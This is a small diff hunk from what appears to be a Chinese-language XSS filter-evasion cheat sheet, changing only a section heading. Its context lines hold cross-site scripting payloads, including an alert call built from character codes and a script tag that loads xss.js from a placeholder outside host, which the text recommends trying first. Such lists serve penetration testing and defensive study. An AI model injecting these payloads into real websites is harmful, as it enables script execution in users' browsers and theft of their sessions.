@@ -253,7 +253,7 @@ alert(String.fromCharCode(88,83,83))//--
 
 `'';!--"<XSS>=&{()}`
 
-### 无过滤绕过
+### 无过滤
 这是一个常规的xss注入代码，虽然通常它会被防御，但是我们建议首先去尝试它。
 
 `<SCRIPT SRC=http://www.eee.eee/xss.js></SCRIPT>`
